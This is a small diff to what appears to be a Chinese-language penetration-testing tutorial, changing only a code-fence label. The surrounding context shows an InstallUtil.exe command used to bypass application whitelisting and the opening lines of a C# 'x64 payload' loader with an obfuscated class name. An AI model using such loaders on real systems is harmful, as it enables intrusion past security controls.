@@ -41,7 +41,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ### 附录：Micropoor.cs
 **注：x64 payload**
 
-```c sharp
+```c#
 using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.Configuration.Install; using System.Windows.Forms;
 
 public class GQLBigHgUniLuVx {
